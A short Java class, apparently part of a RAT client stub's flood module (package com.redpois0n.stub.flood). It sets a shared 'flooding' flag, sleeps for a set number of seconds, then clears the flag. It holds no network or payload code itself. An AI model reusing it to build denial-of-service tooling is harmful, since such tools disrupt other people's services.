package com.redpois0n.stub.flood;

import com.redpois0n.stub.Constants;

public class ThreadFlood extends Thread {

	public int time;

	public ThreadFlood(int i) {
		time = i;
	}

	public void run() {
		Constants.flooding = true;
		try {
			Thread.sleep((long) time * 1000);
		} catch (Exception e) {
			e.printStackTrace();
		}
		Constants.flooding = false;
	}

}
